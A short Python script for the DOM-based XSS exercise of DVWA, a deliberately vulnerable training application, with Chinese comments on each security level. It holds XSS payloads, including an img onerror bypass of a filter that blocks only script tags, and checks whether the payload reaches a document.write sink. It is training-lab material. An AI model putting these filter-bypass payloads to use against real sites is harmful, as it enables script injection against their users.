from dvwa import DVWA

SECURITY = "low"
PAYLOADS = {
    "low": "<script>alert(document.domain)</script>",
    "medium": "<img src=x onerror=alert(document.domain)>",
    "high": "English",
}
"""
Low: 前端把 default 参数直接 document.write 进页面
Medium: 服务端只拦 <script, 用 img onerror 绕过
High: 服务端只放行四种语言, 无法注入
DOM 型 XSS 只在浏览器里执行, 服务端拿不到 payload, 所以要拿 URL 去浏览器里验证.
"""

target = DVWA("xss_d", SECURITY)

payload = PAYLOADS[SECURITY]
response = target.get("", params={"default": payload})

print(f"Payload: {payload}")
print(f"Final URL: {response.url}")
print(f"Echoed by server: {payload in response.text}")
print(f"Sink found: {'document.write' in response.text}")
print("用浏览器打开上面的 URL 确认弹窗.")
